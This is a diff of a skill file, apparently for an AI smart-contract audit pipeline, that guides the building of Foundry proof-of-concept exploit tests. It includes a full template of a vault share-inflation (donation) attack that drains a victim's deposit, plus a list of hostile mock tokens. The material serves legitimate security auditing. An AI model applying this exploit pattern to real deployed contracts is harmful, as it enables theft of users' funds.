@@ -1,55 +1,112 @@
 ---
 name: poc-builder
-description: Exploit PoC construction sub-skill for the ultimate-web3-security pipeline. Turns a validated attack hypothesis into an executable Foundry test (unit or mainnet-fork). Loaded by Phase 6 (Exploit Validation).
+description: Exploit PoC construction sub-skill for the AuditSharingan pipeline. Helps auditors build target-specific Foundry unit and fork tests with explicit harm assertions. Loaded during exploit validation.
 ---
 
-# PoC Builder (Foundry / Fork)
+# PoC Builder (Foundry & Mainnet-Fork)
 
-Turns a validated hypothesis into executable proof. Loaded in Phase 6 for serious candidates.
+Transforms a checked attack hypothesis into a target-specific, executable proof
+attempt. A passing Foundry test is strong evidence, but its assumptions,
+fixtures, fork block, and assertion quality still require review.
 
-## Reading order (anti-anchoring)
+## 1. Anti-Anchoring Reading Discipline
 
-Before writing the PoC, re-read: (1) the target contract code, (2) its dependencies actually on the path, (3) the deployment config. Do NOT re-read your own hypothesis notes first — derive the exploit from the code to avoid anchoring to a wrong assumption.
+Before writing code:
+1. Re-read target contract source directly from disk.
+2. Re-read on-path dependencies and actual deployment constructors.
+3. Do NOT look at initial unvalidated hypothesis notes — derive the exploit directly from the live code to prevent anchoring to false assumptions.
 
-## Finding classification (choose the PoC type)
+## 2. Test Architecture & Classification
 
-- **(a) Pure logic bug** (broken invariant in fresh code): unit-level Foundry test with mocks is acceptable — the exploit holds in any deployment.
-- **(b) State/deployment-dependent bug** (needs real tokens, real pools, real oracle config): fork test against the deployed addresses. Mocks can CONFIRM a finding but never REFUTE it — a mock-based failure does not kill a candidate; only a real-path failure does.
+- **Unit-Level PoC (`test/Exploit_Unit.t.sol`):** For self-contained logic bugs, invariant breaches, math rounding errors, and access control bypasses. Uses standard `forge-std/Test.sol` and targeted mocks.
+- **Mainnet-Fork PoC (`test/Exploit_Fork.t.sol`):** For bugs dependent on live on-chain state (Uniswap/Balancer liquidity pools, Chainlink oracle feeds, complex token interactions, proxy state). Pinned to a specific historical block:
+  ```solidity
+  vm.createSelectFork(vm.envString("ETH_RPC_URL"), PINNED_BLOCK_NUMBER);
+  ```
 
-## Fork test setup
+## 3. Standard Foundry PoC Template
 
 ```solidity
-// 1. Pin the block at the top of the test:
-vm.createSelectFork(vm.envString("ETH_RPC_URL"), BLOCK_NUMBER);
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "forge-std/Test.sol";
+import "forge-std/console2.sol";
+import {TargetVault} from "src/TargetVault.sol";
+import {MockERC20} from "test/mocks/MockERC20.sol";
+
+contract ExploitTest is Test {
+    TargetVault public target;
+    MockERC20 public asset;
+
+    address public attacker = makeAddr("attacker");
+    address public victim = makeAddr("victim");
+
+    function setUp() public {
+        asset = new MockERC20("Underlying", "UND", 18);
+        target = new TargetVault(address(asset));
+
+        // Seed victim with 1,000 tokens
+        asset.mint(victim, 1000e18);
+        vm.prank(victim);
+        asset.approve(address(target), type(uint256).max);
+
+        // Seed attacker with minimum capital (e.g. 1 wei or flash-loanable funds)
+        asset.mint(attacker, 1000e18);
+        vm.prank(attacker);
+        asset.approve(address(target), type(uint256).max);
+    }
+
+    function test_exploit_drain() public {
+        // [1. Baseline Pre-State]
+        uint256 victimAssetsBefore = asset.balanceOf(victim);
+        uint256 attackerAssetsBefore = asset.balanceOf(attacker);
+
+        // [2. Attacker Setup / Inflation / State Priming]
+        vm.startPrank(attacker);
+        target.deposit(1, attacker); // 1 wei deposit -> 1 share
+        asset.transfer(address(target), 100e18); // Direct donation
+        vm.stopPrank();
+
+        // [3. Victim Normal Operation]
+        vm.prank(victim);
+        target.deposit(100e18, victim); // Victim deposits 100 ETH -> receives 0 shares
+
+        // [4. Attacker Extraction]
+        vm.prank(attacker);
+        target.redeem(1, attacker, attacker); // Attacker burns 1 share and takes all assets
+
+        // [5. Assert Invariant Violation and Material Harm]
+        uint256 victimAssetsAfter = asset.balanceOf(victim);
+        uint256 attackerAssetsAfter = asset.balanceOf(attacker);
+
+        console2.log("Victim Loss:   ", (victimAssetsBefore - victimAssetsAfter) / 1e18, "tokens");
+        console2.log("Attacker Profit:", (attackerAssetsAfter - attackerAssetsBefore) / 1e18, "tokens");
+
+        // Hard assertions proving the exploit
+        assertLt(victimAssetsAfter, victimAssetsBefore, "Victim should have lost assets");
+        assertGt(attackerAssetsAfter, attackerAssetsBefore, "Attacker should have extracted profit");
+        assertEq(target.balanceOf(victim), 0, "Victim was minted 0 shares for 100 tokens");
+    }
+}
 ```
 
-- Pin a specific block for reproducibility; document the block number.
-- Use the real deployment addresses from recon (Phase 1). Verify on-chain state (balances, roles, oracle prices) before attacking.
-- **Funding rule**: fund the attacker via `deal` ONLY when the attack path in production doesn't depend on how the attacker obtained funds. If the finding is about capital requirements, fund realistically or note the assumption. Never `prank` a contract into sending funds the real contract wouldn't send.
-- Snapshot/rollback (`vm.snapshotState`/`revertToState`) between steps where useful, but the FINAL proof run must be the clean sequence.
+## 4. Hostile Token & Callback Mock Library
 
-## PoC structure (canonical sequence from core/06)
+When testing integration bugs, use specialized hostile mock tokens:
 
-```
-attacker setup → initial state → tx 1 → tx 2
-→ manipulation → state violation → asset extraction / impact → final state
-```
+- **MockFeeOnTransfer:** Deducts `feePercent` during `transferFrom`, simulating tokens like PAXG or deflationary tokens.
+- **MockReentrantToken:** Fires an external callback to `msg.sender` inside `transfer()` or `transferFrom()`, simulating ERC-777 / ERC-1155 recipient hooks.
+- **MockRebasingToken:** Supports manual `rebase(multiplier)` to simulate Lido stETH or Ampleforth supply changes.
+- **MockBlocklistToken:** Allows `setBlocked(address, true)` to simulate USDC/USDT blacklisting causing transfer reverts.
+- **MockZeroTransferRevert:** Reverts whenever `transfer(to, 0)` is called, simulating tokens like LEND or old BNB.
 
-Encode each step as a clearly named function or `console.log` section; assert the state violation (`assertEq`/`assertLt` on balances/state) and the profit at the end.
+## 5. Output Deliverables
 
-## Proof-of-loss discipline
-
-- Record before/after balances of the VICTIM, not just the attacker.
-- Assert the specific invariant broken (`INV-x`) with a comment quoting it.
-- If the exploit requires multiple txs or waiting, simulate time via `vm.warp`/`vm.roll` — but note where real-world timing constraints apply.
-
-## Output
-
-`{AUDIT_DIR}/poc/<finding-slug>/Exploit.t.sol` + `README.md` with:
-
-- one-line root cause,
-- exact run commands (`forge test --match-path ... -vvvv --fork-url $ETH_RPC_URL --fork-block-number N`),
-- expected output (which asserts pass),
-- any assumptions (funding, timing, config).
-
-A PoC that does not reproduce under the clean sequence is NOT a PoC — go back to Phase 6 kill-gates.
+Save all PoCs under `{AUDIT_DIR}/poc/<finding-id>/`:
+- `Exploit.t.sol` — Complete runnable Foundry test file only after the auditor
+  replaces the generated scaffold and reviews every setup assumption.
+- `README.md` containing:
+  - Exact command to execute: `forge test --match-test test_exploit -vvvv` (plus `--fork-url $RPC --fork-block-number N` if fork).
+  - Expected terminal output, passed assertions, and known limitations.
+  - Assumptions (starting balance, flash loan provider, gas limits).
